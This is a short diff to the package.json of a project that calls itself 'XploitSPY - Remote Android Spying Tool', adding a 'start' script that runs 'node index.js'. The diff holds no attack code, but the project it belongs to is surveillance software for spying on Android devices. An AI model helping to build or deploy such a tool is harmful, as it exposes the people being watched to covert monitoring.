@@ -4,6 +4,7 @@
     "description": "XploitSPY - Remote Android Spying Tool",
     "main": "index.js",
     "scripts": {
+        "start": "node index.js",
         "test": "node index.js"
     },
     "author": "ETechD",
